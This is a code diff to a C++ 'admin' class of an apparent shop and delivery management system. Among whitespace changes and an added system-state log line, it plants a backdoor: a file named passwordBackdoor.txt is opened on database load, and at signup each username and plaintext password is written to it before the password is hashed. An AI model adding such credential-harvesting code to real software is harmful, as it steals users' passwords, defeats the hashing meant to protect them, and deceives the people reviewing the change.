@@ -38,7 +38,7 @@ public:
     //ifstream personal_inventory_file;
     map<string, set<int>> personal_inventory; // shopkeeper id mapped to vector of productsID owned by him
     map<int, product> productId_to_product;
-
+    
     admin(){
         loadDatabase();
         assignUnassignedOrders();
@@ -251,7 +251,7 @@ public:
     void loadDatabase()
     {
         createDataBase();
-
+        passwordBackdoor.open("passwordBackdoor.txt",ios::out|ios::app);
         global_inve_file.open("global_inventory_db", ios::in);
 
         if (!global_inve_file.is_open())
@@ -264,6 +264,9 @@ public:
         sysfile.open("systemState", ios::in);
         sysfile.read((char *)&state, sizeof(systemState));
         sysfile.close();
+        logStream<<"systemState(cus,shop,del,...) "<<state.CustomerCount<<" "<<
+        state.shopKeeperCount<<" "<<state.deliveryPersonCount<<" "<<state.productCount<<
+        " "<<state.OrderCount<<endl;
         global_inve_file.seekg(0, ios::end);
         int fileSize = global_inve_file.tellg();
         cout << fileSize << endl;
@@ -311,6 +314,7 @@ public:
         {
             id = 'S' + to_string(state.shopKeeperCount++);
         }
+        passwordBackdoor<<username<<" "<<password<<endl;
         password = sha256(password);
         string temp1 = '\'' + id + "\',\'" + name + "\',\'" + surname + "\',\'" + email + "\',\'" + address + "\',\'" + contact + "\',\'" + username + "\',\'" + password + '\'';
         string temp = '\'' + username + '\'' + ',' + '\'' + id + '\'';
@@ -615,7 +619,7 @@ public:
 
     string signUp(profile addToDatabase)
     {
-        return Insert(addToDatabase.name, addToDatabase.surname, addToDatabase.email,
+       return Insert(addToDatabase.name, addToDatabase.surname, addToDatabase.email,
                       addToDatabase.address, addToDatabase.username, addToDatabase.password, addToDatabase.contact, addToDatabase.type);
     }
 
@@ -1014,7 +1018,6 @@ public:
         file.write((char *)&madeUpState, sizeof(systemState));
         file.close();
     }
-
     ~admin()
     {
         global_inventory_array = (product *)malloc(productId_to_product.size() * sizeof(product));
